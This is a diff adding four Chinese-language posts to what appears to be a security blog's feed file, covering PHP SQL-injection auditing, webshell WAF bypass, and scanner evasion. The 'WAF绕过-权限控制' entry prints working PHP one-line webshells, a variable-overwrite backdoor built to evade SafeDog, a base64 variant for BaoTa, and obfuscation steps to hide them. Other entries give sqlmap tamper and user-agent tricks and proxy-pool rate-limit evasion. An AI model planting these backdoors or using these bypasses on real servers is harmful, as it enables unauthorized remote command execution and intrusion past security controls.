@@ -4,6 +4,92 @@
   
     
     <entry>
+      <title>代码审计--PHP无框架项目SQL注入挖掘技巧</title>
+      <link href="/2022/06/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%97%A0%E6%A1%86%E6%9E%B6%E9%A1%B9%E7%9B%AESQL%E6%B3%A8%E5%85%A5%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/"/>
+      <url>/2022/06/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%97%A0%E6%A1%86%E6%9E%B6%E9%A1%B9%E7%9B%AESQL%E6%B3%A8%E5%85%A5%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>脑图：<br><img src="/2022/06/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%97%A0%E6%A1%86%E6%9E%B6%E9%A1%B9%E7%9B%AESQL%E6%B3%A8%E5%85%A5%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.png" alt="代码审计"></p><h2 id="0x01-使用Fortify进行代码审计"><a href="#0x01-使用Fortify进行代码审计" class="headerlink" title="0x01 使用Fortify进行代码审计"></a>0x01 使用Fortify进行代码审计</h2><p>使用sql靶场源代码为例，颜色代表漏洞危害等级，也可调试代码，可以为繁琐的手工审计节省出大量时间。</p><p><img src="/2022/06/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%97%A0%E6%A1%86%E6%9E%B6%E9%A1%B9%E7%9B%AESQL%E6%B3%A8%E5%85%A5%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/image-20220611221843613.png" alt="image-20220611221843613"></p><h2 id="0x02-定点挖掘"><a href="#0x02-定点挖掘" class="headerlink" title="0x02 定点挖掘"></a>0x02 定点挖掘</h2><h3 id="0x00-关键字"><a href="#0x00-关键字" class="headerlink" title="0x00 关键字"></a>0x00 关键字</h3><p>通过搜索特定关键字尝试寻找特定漏洞，如“select”“insert”“update”等与SQL漏洞自身相关的关键字，或者与变量，特定函数相关的关键字。</p><h3 id="0x01-功能点"><a href="#0x01-功能点" class="headerlink" title="0x01 功能点"></a>0x01 功能点</h3><p>漏洞依靠特定函数实现，而特定函数一般用于实现相关功能。寻找相关功能点，抓包分析找到源码中特定的文件代码段，进行代码分析。</p><p>例如文件上传漏洞，若存在上传的地址，之后通过上传的功能代码进行漏洞挖掘；sql注入也是同理，代码审计时候需要找到和数据库交互的代码段进行测试。</p><h3 id="0x02-拓展"><a href="#0x02-拓展" class="headerlink" title="0x02 拓展"></a>0x02 拓展</h3><p>例如：sql注入</p><p>1、数据库监控：监控当前页面和数据库交互的过程，即SQL语句的执行，适用于SQL注入；</p><p>2、断点调试：访问页面对应代码进行断点调试，了解代码执行的前后顺序，调用的文件列表等。</p><h2 id="0x03-sqqyw源码审计"><a href="#0x03-sqqyw源码审计" class="headerlink" title="0x03 sqqyw源码审计"></a>0x03 sqqyw源码审计</h2><h3 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h3><p>将源文件加载到工具当中：</p><p><img src="/2022/06/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%97%A0%E6%A1%86%E6%9E%B6%E9%A1%B9%E7%9B%AESQL%E6%B3%A8%E5%85%A5%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/image-20220611225221494.png" alt="image-20220611225221494"></p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>搜索特定关键字，如：select，where等；</p><p>全局搜索select：<br><img src="/2022/06/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%97%A0%E6%A1%86%E6%9E%B6%E9%A1%B9%E7%9B%AESQL%E6%B3%A8%E5%85%A5%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/image-20220611225417110.png" alt="image-20220611225417110"></p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>打开其中一个发现编码有问题更改编码：</p><p><img src="/2022/06/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%97%A0%E6%A1%86%E6%9E%B6%E9%A1%B9%E7%9B%AESQL%E6%B3%A8%E5%85%A5%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/image-20220611225457398.png" alt="image-20220611225457398"></p><p><img src="/2022/06/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E6%97%A0%E6%A1%86%E6%9E%B6%E9%A1%B9%E7%9B%AESQL%E6%B3%A8%E5%85%A5%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/image-20220611225608673.png" alt="image-20220611225608673"></p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p> 之后对参数点，功能点进行追踪分析是否存在SQL注入漏洞；若存在注入点利用SQL注入的思路进行SQL注入。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 代码审计 </category>
+          
+          <category> SQL注入 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> SQL注入 </tag>
+            
+            <tag> 代码审计 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>WAF绕过-权限控制</title>
+      <link href="/2022/06/11/WAF%E7%BB%95%E8%BF%87-%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6/"/>
+      <url>/2022/06/11/WAF%E7%BB%95%E8%BF%87-%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>脑图：<br><img src="/2022/06/11/WAF%E7%BB%95%E8%BF%87-%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6/WAF%E7%BB%95%E8%BF%87-%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6.png" alt="WAF绕过-权限控制"></p><h2 id="0x01-变量覆盖"><a href="#0x01-变量覆盖" class="headerlink" title="0x01 变量覆盖"></a>0x01 变量覆盖</h2><p>一句话木马，用eval()函数将字符串转换为PHP代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @ev删掉这串汉字<span class="token function">al</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>‘chop删掉这串汉字per’<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用ass删掉这串汉字ert代替eval()：</p><p>（eval()会被检测）</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> ass删掉这串汉字<span class="token function">ert</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>‘chopper’<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>变量覆盖，覆盖原始变量，安全狗追踪变量时无法找到变量b的出处：</p><p>后门代码：绕过安全狗</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>‘x’<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>‘y’<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>‘z’<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>这里利用参数传递变量：$a接收x值b，而此时的b就是下面的$b,$a又接收y值assert,此时x值=y值，也就是$b=assert()；实现绕过。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用代码时传参：?x=b&amp;y=assert Post data：z=需要执行的命令</p><p>使用base64加密传输命令，<strong>绕过宝塔</strong>：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>‘x’<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>‘y’<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token punctuation">(</span><span class="token function">base64_decode</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>‘z’<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> 由于输入的z值可能会被宝塔检测到，例如：phpinfo()这样的函数，因此使用base64加密方式去绕过。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x02-加密混淆"><a href="#0x02-加密混淆" class="headerlink" title="0x02 加密混淆"></a>0x02 加密混淆</h2><p>用enphp加密来绕过检测：</p><p>一句话木马：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">assert</span><span class="token punctuation">(</span><span class="token function">base64_decode</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>‘z’<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在enphp的文件夹中打开cmd，执行“php.exe code_test.php”，可以通过“func_v2.php”来调整参数，程序会自动把“code_test”文件夹下的文件加密，加密结果生成在“encoded”文件夹下。</p><p><strong>原理：由于加密程度越高，越容易混淆，加密过于复杂，WAF在检测时候无法解密出原始代码，实现绕过。</strong></p><p>PHP在线加密：</p><p><a href="https://www.phpjiami.com/phpjiami.html">https://www.phpjiami.com/phpjiami.html</a> </p><h2 id="0x03-工具连接带有编码解码绕过的一句话"><a href="#0x03-工具连接带有编码解码绕过的一句话" class="headerlink" title="0x03 工具连接带有编码解码绕过的一句话"></a>0x03 工具连接带有编码解码绕过的一句话</h2><p>1、蚁剑，选中对应地址，右键“添加数据”，编码器选择对应的加密方式</p><p>2、菜刀，无此功能</p><p>3、冰蝎，双向加密传输</p><p>冰蝎双向加密传输图解：</p><p><img src="/2022/06/11/WAF%E7%BB%95%E8%BF%87-%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6/image-20220611120451633.png" alt="image-20220611120451633"></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> Bypass WAF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>WAF绕过-漏洞利用之注入上传跨站等绕过</title>
+      <link href="/2022/06/10/WAF%E7%BB%95%E8%BF%87-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8B%E6%B3%A8%E5%85%A5%E4%B8%8A%E4%BC%A0%E8%B7%A8%E7%AB%99%E7%AD%89%E7%BB%95%E8%BF%87/"/>
+      <url>/2022/06/10/WAF%E7%BB%95%E8%BF%87-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8B%E6%B3%A8%E5%85%A5%E4%B8%8A%E4%BC%A0%E8%B7%A8%E7%AB%99%E7%AD%89%E7%BB%95%E8%BF%87/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>脑图：<br><img src="/2022/06/10/WAF%E7%BB%95%E8%BF%87-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8B%E6%B3%A8%E5%85%A5%E4%B8%8A%E4%BC%A0%E8%B7%A8%E7%AB%99%E7%AD%89%E7%BB%95%E8%BF%87/WAF%E7%BB%95%E8%BF%87-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8.png" alt="WAF绕过-漏洞利用"></p><h2 id="0x01-SQL注入"><a href="#0x01-SQL注入" class="headerlink" title="0x01 SQL注入"></a>0x01 SQL注入</h2><p>使用如sqlmap等工具注入时，为防止CC拦截，修改数据包us头模仿爬虫，或使用代理池</p><p>安全狗：参考之前payload</p><p>Aliyun：基本修改指纹即可</p><p>宝塔：匹配关键字，包括“/*”，注入语句的每个“/*”都改为“%00/*”（利用了00截断）</p><p>sqlmap使用语句：sqlmap –proxy=”<a href="http://127.0.0.1:8080&quot;">http://127.0.0.1:8080&quot;</a> –tamper=”waf.py” –random-agent</p><p>sqlmap也可以用“–user-agent”指定ua</p><p><strong>（WAF有检测各种注入工具的请求头，因此要修改UA）</strong></p><h2 id="0x02-文件上传"><a href="#0x02-文件上传" class="headerlink" title="0x02 文件上传"></a>0x02 文件上传</h2><p>截断，参考之前文件上传waf绕过payload。</p><h2 id="0x03-XSS跨站"><a href="#0x03-XSS跨站" class="headerlink" title="0x03 XSS跨站"></a>0x03 XSS跨站</h2><p>利用XSStrike绕过，加上“–timeout”或“–proxy”绕过CC。</p><h2 id="0x04-RCE"><a href="#0x04-RCE" class="headerlink" title="0x04 RCE"></a>0x04 RCE</h2><p>1、加解密：尝试用base64、ASCII码等可逆的加密绕过；</p><p>2、替换：在数据中插入某字符，同时加入将该字符替换为空的函数；</p><p>3、利用变量覆盖或者把函数拆开然后用参数拼接（CTF常考）；</p><p>4、base64不行就用ASCII码，加解密不行就用替换，GET不行就用REQUEST；</p><h2 id="0x05-文件包含"><a href="#0x05-文件包含" class="headerlink" title="0x05 文件包含"></a>0x05 文件包含</h2><p>符号变异，“\”“/”</p><h2 id="0x06-逻辑漏洞"><a href="#0x06-逻辑漏洞" class="headerlink" title="0x06 逻辑漏洞"></a>0x06 逻辑漏洞</h2><p>逻辑越权类的漏洞WAF不容易检测，也不容易拦截，一般不需要绕过WAF，基本不受WAF影响。</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> Bypass WAF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>WAF绕过-漏洞发现之代理池指纹被动探针</title>
+      <link href="/2022/06/10/WAF%E7%BB%95%E8%BF%87-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E4%B9%8B%E4%BB%A3%E7%90%86%E6%B1%A0%E6%8C%87%E7%BA%B9%E8%A2%AB%E5%8A%A8%E6%8E%A2%E9%92%88/"/>
+      <url>/2022/06/10/WAF%E7%BB%95%E8%BF%87-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E4%B9%8B%E4%BB%A3%E7%90%86%E6%B1%A0%E6%8C%87%E7%BA%B9%E8%A2%AB%E5%8A%A8%E6%8E%A2%E9%92%88/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>脑图：<br><img src="/2022/06/10/WAF%E7%BB%95%E8%BF%87-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E4%B9%8B%E4%BB%A3%E7%90%86%E6%B1%A0%E6%8C%87%E7%BA%B9%E8%A2%AB%E5%8A%A8%E6%8E%A2%E9%92%88/WAF%E7%BB%95%E8%BF%87-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0.png" alt="WAF绕过-漏洞发现"></p><h2 id="0x01-漏洞发现触发WAF点-针对xray-awvs等"><a href="#0x01-漏洞发现触发WAF点-针对xray-awvs等" class="headerlink" title="0x01 漏洞发现触发WAF点-针对xray,awvs等"></a>0x01 漏洞发现触发WAF点-针对xray,awvs等</h2><p>1、扫描速度-(代理池，延迟，白名单等)：速度过快肯定会被拦截</p><p>2、工具指纹-(特征修改，伪造模拟真实用户等)</p><p>3、漏洞Payload-(数据变异，数据加密，白名单等)</p><p>（热门的扫描工具（awvs，xray等）一般会被WAF拦截，针对单点的漏洞发现工具一般不会被拦截）</p><h2 id="0x02-代理池Proxy-pool项目搭建及使用"><a href="#0x02-代理池Proxy-pool项目搭建及使用" class="headerlink" title="0x02 代理池Proxy_pool项目搭建及使用"></a>0x02 代理池Proxy_pool项目搭建及使用</h2><p>使用方法：</p><p>启用Redis数据库：“此电脑”右键“管理”“服务和应用程序”“Redis”右键“启用”</p><p>setting.py，在“HOST”处填写本地地址</p><p>setting.py，在“DB_CONN”处以“’redis://:password@ip:port/db’”的格式填写Redis数据库的账号密码还有IP端口</p><p>运行“proxyPool.py”，加参数“schedule”启动调度程序，加参数“server”启动api服务</p><p>程序会将收集到的可用的代理写到数据库中。</p><p>代理池项目地址：</p><p><a href="https://github.com/jhao104/proxy_pool">https://github.com/jhao104/proxy_pool</a></p><h2 id="0x03-Aliyun-os-awvs漏扫注入测试绕过-延时白名单"><a href="#0x03-Aliyun-os-awvs漏扫注入测试绕过-延时白名单" class="headerlink" title="0x03 Aliyun_os-awvs漏扫注入测试绕过-延时白名单"></a>0x03 Aliyun_os-awvs漏扫注入测试绕过-延时白名单</h2><p><strong>对阿里云和宝塔的绕过基本采用延迟。</strong></p><p>awvs可以改变数据包内容，因此可以绕过工具指纹和漏洞payload检测，但xray没有相关功能所以没法绕过</p><p>不同工具的判定方式不一样，一个工具被拦截可以换个工具试试</p><p>新开发或冷门的扫描工具可能未被WAF收集，因此可以绕过工具指纹和漏洞payload检测</p><p>如果工具没法控制发送速度，可以用burpsuite做漏扫工具的代理，使用鼠标点击器定速放出数据包。</p><h2 id="0x04-BT-awvs-xray漏扫Payload绕过-延时被动"><a href="#0x04-BT-awvs-xray漏扫Payload绕过-延时被动" class="headerlink" title="0x04 BT-awvs+xray漏扫Payload绕过-延时被动"></a>0x04 BT-awvs+xray漏扫Payload绕过-延时被动</h2><p>xray扫描不会被宝塔拦截，可能是因为宝塔暂未收录xray的信息</p><p>awvs联动xray扫描：</p><p>正常设置awvs，然后设置代理，代理可以直接设置为xray，也可以设置为burpsuite来看数据包发包情况，然后再转发到xray（被动扫描）。地址为“127.0.0.1”，端口自己设置。</p><p>如果使用burpsuite，设置代理，从参照被动扫描部分</p><p>打开xray，被动扫描，输入命令“.\xray的程序名 webscan –listen 地址:端口”，地址端口与被动扫描的一致。</p><p>启动xray，然后启动awvs，开始扫描</p><p>（绕过安全狗同理）</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> Bypass WAF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>WAF绕过-信息搜集反爬虫延时代理池技术</title>
       <link href="/2022/06/09/WAF%E7%BB%95%E8%BF%87-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E5%8F%8D%E7%88%AC%E8%99%AB%E5%BB%B6%E6%97%B6%E4%BB%A3%E7%90%86%E6%B1%A0%E6%8A%80%E6%9C%AF/"/>
       <url>/2022/06/09/WAF%E7%BB%95%E8%BF%87-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E5%8F%8D%E7%88%AC%E8%99%AB%E5%BB%B6%E6%97%B6%E4%BB%A3%E7%90%86%E6%B1%A0%E6%8A%80%E6%9C%AF/</url>
